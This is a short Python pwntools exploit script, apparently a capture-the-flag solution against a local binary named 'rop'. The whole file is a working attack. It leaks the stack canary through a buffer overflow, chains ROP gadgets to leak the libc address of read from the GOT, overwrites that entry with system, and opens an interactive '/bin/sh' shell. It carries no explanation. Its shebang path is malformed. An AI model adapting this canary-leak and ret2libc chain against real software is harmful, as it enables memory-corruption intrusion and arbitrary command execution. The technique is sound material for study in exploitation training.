#! /bin/usr/python3

from pwn import *

p = process('./rop', env={"LD_PRELOAD":'./libc.so.6'})
libc = ELF('./libc.so.6')
e = ELF('./rop')

buf = b'A'*0x39
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00'+ p.recvn(7))

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']

print(read_got)
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400596

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(10)
payload += p64(write_plt)

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(10)
payload += p64(read_plt)

payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(8))
print(read)

lb = read - libc.symbols['read']
system = lb + libc.symbols['system']

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()